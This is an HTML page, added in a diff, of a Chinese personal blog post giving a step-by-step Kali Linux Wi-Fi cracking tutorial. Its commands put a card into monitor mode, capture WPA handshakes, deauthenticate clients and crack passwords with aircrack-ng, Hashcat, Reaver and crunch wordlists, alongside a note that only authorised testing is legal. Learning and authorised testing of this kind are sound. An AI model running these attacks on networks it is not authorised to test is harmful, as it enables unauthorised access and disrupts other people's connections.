@@ -1,0 +1,265 @@
+<!DOCTYPE html><html lang="[&quot;zh-CN&quot;,&quot;default&quot;]" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Kali Linux Wi-Fi 破解教程 | Blueice's Blog</title><meta name="author" content="Blueice"><meta name="copyright" content="Blueice"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Kali Linux Wi-Fi 破解教程下面是一个更详细的 Kali Linux Wi-Fi 破解教程，包括各个步骤的详细解释。此教程用于合法的渗透测试和网络安全评估，请不要用于非法活动。 一、准备工作 安装 Kali Linux：  下载最新的 Kali Linux ISO 镜像文件，并将其安装在虚拟机或物理机上。 安装时，选择完整安装，确保网络安全工具包括 aircrack-ng 套件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux Wi-Fi 破解教程">
+<meta property="og:url" content="http://example.com/post/kali-linux-wifi-cracking-tutorial-z1omoht.html">
+<meta property="og:site_name" content="Blueice&#39;s Blog">
+<meta property="og:description" content="Kali Linux Wi-Fi 破解教程下面是一个更详细的 Kali Linux Wi-Fi 破解教程，包括各个步骤的详细解释。此教程用于合法的渗透测试和网络安全评估，请不要用于非法活动。 一、准备工作 安装 Kali Linux：  下载最新的 Kali Linux ISO 镜像文件，并将其安装在虚拟机或物理机上。 安装时，选择完整安装，确保网络安全工具包括 aircrack-ng 套件。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2024-10-07T03:05:46.000Z">
+<meta property="article:modified_time" content="2024-10-09T02:57:44.000Z">
+<meta property="article:author" content="Blueice">
+<meta property="article:tag" content="kali">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="WIFI">
+<meta property="article:tag" content="运维">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/post/kali-linux-wifi-cracking-tutorial-z1omoht.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Kali Linux Wi-Fi 破解教程',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-09 10:57:44'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Blueice's Blog"><span class="site-name">Blueice's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Kali Linux Wi-Fi 破解教程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-10-07T03:05:46.000Z" title="发表于 2024-10-07 11:05:46">2024-10-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-09T02:57:44.000Z" title="更新于 2024-10-09 10:57:44">2024-10-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Kali Linux Wi-Fi 破解教程"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Kali-Linux-Wi-Fi-破解教程"><a href="#Kali-Linux-Wi-Fi-破解教程" class="headerlink" title="Kali Linux Wi-Fi 破解教程"></a>Kali Linux Wi-Fi 破解教程</h1><p>下面是一个更详细的 <strong>Kali Linux Wi-Fi 破解教程</strong>，包括各个步骤的详细解释。此教程用于合法的渗透测试和网络安全评估，请不要用于非法活动。</p>
+<h3 id="一、准备工作"><a href="#一、准备工作" class="headerlink" title="一、准备工作"></a>一、准备工作</h3><ol>
+<li><p><strong>安装 Kali Linux</strong>：</p>
+<ul>
+<li>下载最新的 <a target="_blank" rel="noopener" href="https://www.kali.org/get-kali/">Kali Linux</a> ISO 镜像文件，并将其安装在虚拟机或物理机上。</li>
+<li>安装时，选择完整安装，确保网络安全工具包括 <code>aircrack-ng</code> 套件。</li>
+</ul>
+</li>
+<li><p><strong>硬件要求</strong>：</p>
+<ul>
+<li><strong>无线网卡</strong>：必须支持<strong>监控模式</strong>和<strong>包注入</strong>，推荐使用像 Alfa AWUS036NH 之类的高性能网卡。</li>
+</ul>
+</li>
+<li><p><strong>更新 Kali Linux</strong>：</p>
+<ul>
+<li>确保系统和工具是最新的：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt upgrade -y</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="二、工具概述"><a href="#二、工具概述" class="headerlink" title="二、工具概述"></a>二、工具概述</h3><ul>
+<li><strong>Aircrack-ng</strong>：这是一个用于网络监控、捕获数据包、密钥破解的 Wi-Fi 破解工具集。</li>
+<li><strong>Airmon-ng</strong>：将无线网卡置于监控模式。</li>
+<li><strong>Airodump-ng</strong>：用于捕获 Wi-Fi 网络的数据包。</li>
+<li><strong>Aireplay-ng</strong>：注入网络包进行干扰或欺骗攻击，常用于解除客户端的连接（deauth）。</li>
+<li><strong>Aircrack-ng</strong>：通过字典破解捕获到的握手包，获取 Wi-Fi 密码。</li>
+</ul>
+<h3 id="三、详细步骤"><a href="#三、详细步骤" class="headerlink" title="三、详细步骤"></a>三、详细步骤</h3><h4 id="1-将无线网卡切换为监控模式"><a href="#1-将无线网卡切换为监控模式" class="headerlink" title="1. 将无线网卡切换为监控模式"></a>1. 将无线网卡切换为监控模式</h4><p>Kali Linux 默认网卡工作在管理模式下（不捕获流量）。使用 <code>airmon-ng</code> 启动监控模式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>wlan0</code> 是你的无线网卡接口名称，可以通过 <code>ifconfig</code> 查看。</p>
+</li>
+<li><p>如果看到错误提示与进程冲突，可使用以下命令杀死冲突进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> airmon-ng check <span class="built_in">kill</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="2-扫描周围的-Wi-Fi-网络"><a href="#2-扫描周围的-Wi-Fi-网络" class="headerlink" title="2. 扫描周围的 Wi-Fi 网络"></a>2. 扫描周围的 Wi-Fi 网络</h4><p>使用 <code>airodump-ng</code> 来扫描周围的 Wi-Fi 网络：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> airodump-ng wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>此命令会显示：</p>
+<ul>
+<li>BSSID：路由器的 MAC 地址。</li>
+<li>PWR：信号强度。</li>
+<li>CH：信道（Channel）。</li>
+<li>ENC：加密类型（如 WPA、WPA2）。</li>
+<li>ESSID：Wi-Fi 网络名称。</li>
+</ul>
+<p><img src="https://image.240123.xyz/2024/10/b597aa6fe85a97c200469f13306a8973.png" alt="截图_2024-09-27_13-32-23"></p>
+<h4 id="3-选择目标-Wi-Fi-网络并捕获握手包"><a href="#3-选择目标-Wi-Fi-网络并捕获握手包" class="headerlink" title="3. 选择目标 Wi-Fi 网络并捕获握手包"></a>3. 选择目标 Wi-Fi 网络并捕获握手包</h4><p>找到目标 Wi-Fi 网络后，记下其 BSSID 和信道，然后运行以下命令开始捕获握手包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> airodump-ng --bssid [目标BSSID] --channel [信道] -w [保存文件名] wlan0mon</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>--bssid</code> 后跟目标 Wi-Fi 的 BSSID。</li>
+<li><code>--channel</code> 后跟信道号。</li>
+<li><code>-w</code> 表示保存握手包的文件名。</li>
+</ul>
+<p>例子：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> airodump-ng --bssid D4:62:EA:5E:9B:A0 --channel 6 -w /home/kali/Desktop/wsb/ wlan0mon</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://image.240123.xyz/2024/10/ea6dfeec2501d7ff2b23b8d512f72c69.png" alt="截图_2024-09-27_14-04-58">​</p>
+<p>这个命令会捕获目标 Wi-Fi 网络上的数据包，直到捕获到握手包。</p>
+<h4 id="4-强制客户端重新连接（Deauthentication-攻击）"><a href="#4-强制客户端重新连接（Deauthentication-攻击）" class="headerlink" title="4. 强制客户端重新连接（Deauthentication 攻击）"></a>4. 强制客户端重新连接（Deauthentication 攻击）</h4><p>不要关闭捕获握手包，重新开一个窗口进行攻击</p>
+<p>如果在捕获过程中没有用户连接到 Wi-Fi 或没有获取到握手包，可以使用 <code>aireplay-ng</code> 发送断开（deauth）请求，强制客户端重新连接，以便捕获握手包：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> aireplay-ng --deauth 10 -a [路由器mac地址] -c [客户端mac地址] wlan0mon</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>--deauth 10</code> 意思是发送 10 个 deauth 包，10 是可调的数字，代表包的数量。</li>
+<li><code>-a</code> 路由器 mac 地址 。</li>
+<li><code> -c</code> 客户端 mac 地址。</li>
+</ul>
+<p>例子：</p>
+<h4 id="5-检查是否成功捕获握手包"><a href="#5-检查是否成功捕获握手包" class="headerlink" title="5. 检查是否成功捕获握手包"></a>5. 检查是否成功捕获握手包</h4><p>当客户端重新连接时，<code>airodump-ng</code> 窗口的右上角会提示 <code>WPA handshake: [目标BSSID]</code>，表示已成功捕获握手包。握手包会保存在你指定的 <code>.cap</code> 文件中。</p>
+<p>​<img src="https://image.240123.xyz/2024/10/bb83e2b5e8dcf8c38429c182d904853f.png" alt="捕获握手包成功">​</p>
+<h4 id="6-使用字典文件破解-Wi-Fi-密码"><a href="#6-使用字典文件破解-Wi-Fi-密码" class="headerlink" title="6. 使用字典文件破解 Wi-Fi 密码"></a>6. 使用字典文件破解 Wi-Fi 密码</h4><p>握手包捕获完成后，接下来使用 <code>aircrack-ng</code> 工具来破解 Wi-Fi 密码。你需要一个包含常见密码的字典文件。网络上有很多常用的字典文件，推荐使用 <code>rockyou.txt</code>，它通常位于 <code>/usr/share/wordlists/</code> 中：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [目标BSSID] [捕获文件名].<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-w</code> 后跟字典文件的路径。</li>
+<li><code>-b</code> 后跟目标 Wi-Fi 的 BSSID。</li>
+<li><code>捕获文件名.cap</code> 是你之前保存的握手包文件。</li>
+</ul>
+<p>破解过程可能需要一些时间，具体取决于密码的复杂性和字典文件的大小。</p>
+<h4 id="7-破解成功"><a href="#7-破解成功" class="headerlink" title="7. 破解成功"></a>7. 破解成功</h4><p>如果目标 Wi-Fi 的密码在字典文件中，<code>aircrack-ng</code> 将输出 Wi-Fi 密码。你可以使用该密码连接到 Wi-Fi 网络。</p>
+<p>​<img src="https://image.240123.xyz/2024/10/a825abb396145e7a3d9648a8fe29cd9b.png" alt="截图_2024-09-27_15-03-39">​</p>
+<h3 id="四、进阶工具和技巧"><a href="#四、进阶工具和技巧" class="headerlink" title="四、进阶工具和技巧"></a>四、进阶工具和技巧</h3><ol>
+<li><p><strong>Hashcat</strong>：<br>Hashcat 是一个更强大的密码破解工具，它支持 GPU 加速，可以大幅加快破解速度。使用 Hashcat 破解 WPA2 密码需要将 <code>.cap</code> 文件转换为 Hashcat 支持的格式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hcxpcapngtool -o hashcat.hccapx [捕获文件名].<span class="built_in">cap</span></span><br></pre></td></tr></table></figure>
+
+<p>然后使用 Hashcat 进行破解：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 2500 hashcat.hccapx /path/to/wordlist.txt</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>Reaver（针对 WPS 漏洞）</strong> ：<br>如果目标 Wi-Fi 网络启用了 WPS 功能，你可以使用 <code>Reaver</code> 工具来尝试暴力破解 WPS PIN，从而绕过 WPA&#x2F;WPA2 加密：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> reaver -i wlan0mon -b [目标BSSID] -vv</span><br></pre></td></tr></table></figure>
+
+<p>这个方法对于没有禁用 WPS 的路由器特别有效。</p>
+</li>
+<li><p><strong>字典生成器</strong>：<br>如果默认字典文件不足以破解密码，可以使用 <code>Crunch</code> 工具来生成符合特定模式的字典文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 8 10 abcdefghijklmnopqrstuvwxyz -o custom_wordlist.txt</span><br></pre></td></tr></table></figure>
+
+<p>该命令生成一个由 8 到 10 位的小写字母组成的字典文件。</p>
+</li>
+</ol>
+<h3 id="五、重要的注意事项"><a href="#五、重要的注意事项" class="headerlink" title="五、重要的注意事项"></a>五、重要的注意事项</h3><ol>
+<li><strong>合法性</strong>：<br>你必须对目标网络拥有明确的授权。未经授权的 Wi-Fi 渗透测试是非法的，可能导致严重的法律后果。</li>
+<li><strong>加密方式</strong>：<br>使用 WPA3 加密的网络非常难以破解，目前没有有效的公开方法来破解 WPA3。</li>
+<li><strong>复杂性</strong>：<br>破解时间取决于密码的复杂性和字典的质量。较强的密码可能需要很长时间甚至无法破解。</li>
+</ol>
+<p>以上是一个较为详细的 Kali Linux 破解 Wi-Fi 的教程，主要目的是为了教育和网络安全测试。如果你对网络安全感兴趣，可以深入学习更多合法的渗透测试方法和技术。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">Blueice</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/post/kali-linux-wifi-cracking-tutorial-z1omoht.html">http://example.com/post/kali-linux-wifi-cracking-tutorial-z1omoht.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Blueice's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/kali/">kali</a><a class="post-meta__tags" href="/tags/Linux/">Linux</a><a class="post-meta__tags" href="/tags/WIFI/">WIFI</a><a class="post-meta__tags" href="/tags/%E8%BF%90%E7%BB%B4/">运维</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/git-tutorial-1bqmz0.html" title="Git教程"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Git教程</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Blueice</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/lingkai0123" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:lingkai0123@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Kali-Linux-Wi-Fi-%E7%A0%B4%E8%A7%A3%E6%95%99%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">Kali Linux Wi-Fi 破解教程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="toc-number">1.0.1.</span> <span class="toc-text">一、准备工作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%B7%A5%E5%85%B7%E6%A6%82%E8%BF%B0"><span class="toc-number">1.0.2.</span> <span class="toc-text">二、工具概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.0.3.</span> <span class="toc-text">三、详细步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B0%86%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%88%87%E6%8D%A2%E4%B8%BA%E7%9B%91%E6%8E%A7%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">1. 将无线网卡切换为监控模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%89%AB%E6%8F%8F%E5%91%A8%E5%9B%B4%E7%9A%84-Wi-Fi-%E7%BD%91%E7%BB%9C"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">2. 扫描周围的 Wi-Fi 网络</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%80%89%E6%8B%A9%E7%9B%AE%E6%A0%87-Wi-Fi-%E7%BD%91%E7%BB%9C%E5%B9%B6%E6%8D%95%E8%8E%B7%E6%8F%A1%E6%89%8B%E5%8C%85"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">3. 选择目标 Wi-Fi 网络并捕获握手包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%BC%BA%E5%88%B6%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%87%8D%E6%96%B0%E8%BF%9E%E6%8E%A5%EF%BC%88Deauthentication-%E6%94%BB%E5%87%BB%EF%BC%89"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">4. 强制客户端重新连接（Deauthentication 攻击）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F%E6%8D%95%E8%8E%B7%E6%8F%A1%E6%89%8B%E5%8C%85"><span class="toc-number">1.0.3.5.</span> <span class="toc-text">5. 检查是否成功捕获握手包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8%E5%AD%97%E5%85%B8%E6%96%87%E4%BB%B6%E7%A0%B4%E8%A7%A3-Wi-Fi-%E5%AF%86%E7%A0%81"><span class="toc-number">1.0.3.6.</span> <span class="toc-text">6. 使用字典文件破解 Wi-Fi 密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%A0%B4%E8%A7%A3%E6%88%90%E5%8A%9F"><span class="toc-number">1.0.3.7.</span> <span class="toc-text">7. 破解成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E8%BF%9B%E9%98%B6%E5%B7%A5%E5%85%B7%E5%92%8C%E6%8A%80%E5%B7%A7"><span class="toc-number">1.0.4.</span> <span class="toc-text">四、进阶工具和技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E9%87%8D%E8%A6%81%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.0.5.</span> <span class="toc-text">五、重要的注意事项</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/kali-linux-wifi-cracking-tutorial-z1omoht.html" title="Kali Linux Wi-Fi 破解教程">Kali Linux Wi-Fi 破解教程</a><time datetime="2024-10-07T03:05:46.000Z" title="发表于 2024-10-07 11:05:46">2024-10-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/git-tutorial-1bqmz0.html" title="Git教程">Git教程</a><time datetime="2024-10-06T14:51:13.000Z" title="发表于 2024-10-06 22:51:13">2024-10-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Blueice</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" 